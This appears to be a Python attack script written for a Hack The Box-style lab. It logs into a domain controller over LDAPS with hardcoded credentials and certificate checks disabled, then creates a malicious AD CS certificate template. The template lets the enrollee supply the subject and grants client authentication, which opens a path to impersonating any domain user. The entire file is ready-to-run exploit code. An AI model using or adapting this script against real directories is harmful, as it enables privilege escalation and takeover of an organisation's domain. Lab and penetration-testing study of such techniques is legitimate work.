#!/usr/bin/env python3
import struct, ssl
from ldap3 import Server, Connection, ALL, NTLM, Tls

# Setup TLS (insecure cert validation for HTB-style envs)
tls = Tls(validate=ssl.CERT_NONE)

# LDAP connection settings
server_ip = "10.129.31.40" # change here
port = 636
use_ssl = True
user_dn = "DANGLINGTREE\\jake.h"
password = "Passw0rd1!" # change here

# Target DN for the new Certificate Template
dn = "CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb"

# Template attributes (as per your one-liner)
attributes = {
    "objectClass": ["top", "pKICertificateTemplate"],
    "cn": "EmployeeAuthTemplate",
    "displayName": "EmployeeAuthTemplate",
    "flags": 131680,
    "revision": 100,
    "pKIDefaultKeySpec": 1,
    "pKIKeyUsage": b"\xa0\x00",
    "pKIMaxIssuingDepth": 0,
    "pKICriticalExtensions": ["2.5.29.15"],
    "pKIExtendedKeyUsage": ["1.3.6.1.5.5.7.3.2"],
    "pKIDefaultCSPs": ["1,Microsoft RSA SChannel Cryptographic Provider"],
    "pKIExpirationPeriod": struct.pack("<q", -315360000000000),
    "pKIOverlapPeriod": struct.pack("<q", -36288000000000),
    "msPKI-Certificate-Name-Flag": 1,
    "msPKI-Enrollment-Flag": 0,
    "msPKI-Minimal-Key-Size": 2048,
    "msPKI-Private-Key-Flag": 0,
    "msPKI-RA-Signature": 0,
    "msPKI-Template-Minor-Revision": 1,
    "msPKI-Template-Schema-Version": 2,
    "msPKI-Certificate-Application-Policy": ["1.3.6.1.5.5.7.3.2"],
    "msPKI-Cert-Template-OID": "1.3.6.1.4.1.311.21.8.9999999.8888888.7777777.6666666.5555555.1.33.1"
}

# Connect and add the object
server = Server(server_ip, port=port, use_ssl=use_ssl, tls=tls, get_info=ALL)
c = Connection(server, user=user_dn, password=password, authentication=NTLM, auto_bind=True)

result = c.add(dn, attributes=attributes)
print("[+] Created" if result else "[-] " + str(c.result["description"]))

# Disconnect cleanly
c.unbind()
